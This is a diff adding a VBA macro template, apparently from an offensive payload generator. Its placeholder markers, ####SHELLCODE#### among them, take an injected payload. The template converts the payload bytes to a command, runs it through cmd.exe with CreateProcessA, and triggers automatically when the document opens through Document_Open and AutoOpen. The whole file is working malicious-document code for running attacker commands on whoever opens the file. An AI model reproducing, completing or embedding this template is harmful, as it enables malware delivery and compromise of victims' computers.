@@ -1,0 +1,86 @@
+//####DEFINE####
+Private Declare PtrSafe Function CreateProcessA Lib "kernel32" ( _
+    ByVal lpApplicationName As String, _
+    ByVal lpCommandLine As String, _
+    ByVal lpProcessAttributes As LongPtr, _
+    ByVal lpThreadAttributes As LongPtr, _
+    ByVal bInheritHandles As Long, _
+    ByVal dwCreationFlags As Long, _
+    ByVal lpEnvironment As LongPtr, _
+    ByVal lpCurrentDirectory As String, _
+    lpStartupInfo As STARTUPINFO, _
+    lpProcessInformation As PROCESS_INFORMATION _
+) As Long
+
+Private Type STARTUPINFO
+    cb As Long
+    lpReserved As String
+    lpDesktop As String
+    lpTitle As String
+    dwX As Long
+    dwY As Long
+    dwXSize As Long
+    dwYSize As Long
+    dwXCountChars As Long
+    dwYCountChars As Long
+    dwFillAttribute As Long
+    dwFlags As Long
+    wShowWindow As Integer
+    cbReserved2 As Integer
+    lpReserved2 As LongPtr
+    hStdInput As LongPtr
+    hStdOutput As LongPtr
+    hStdError As LongPtr
+End Type
+
+Private Type PROCESS_INFORMATION
+    hProcess As LongPtr
+    hThread As LongPtr
+    dwProcessId As Long
+    dwThreadId As Long
+End Type
+
+//####CODE####
+
+Function ExecuteCommand()
+    Dim buf As Variant
+    buf = ####SHELLCODE####
+    
+    //####CALL####
+    
+    Dim command As String
+    
+    ' Check if input is already a string
+    If VarType(buf) = vbString Then
+        command = buf
+    Else
+        ' Convert byte array to string
+        command = BytesToString(buf)
+    End If
+    
+    ' Execute command using CreateProcess
+    Dim si As STARTUPINFO
+    Dim pi As PROCESS_INFORMATION
+    
+    si.cb = Len(si)
+    CreateProcessA "cmd.exe", "/c " & command, 0, 0, 1, 0, 0, vbNullString, si, pi
+End Function
+
+Private Function BytesToString(bytes() As Byte) As String
+    Dim result As String
+    result = ""
+    
+    For i = LBound(bytes) To UBound(bytes)
+        result = result & Chr(bytes(i))
+    Next i
+    
+    BytesToString = result
+End Function
+
+Sub Document_Open()
+    ExecuteCommand
+End Sub
+
+Sub AutoOpen()
+    ExecuteCommand
+End Sub
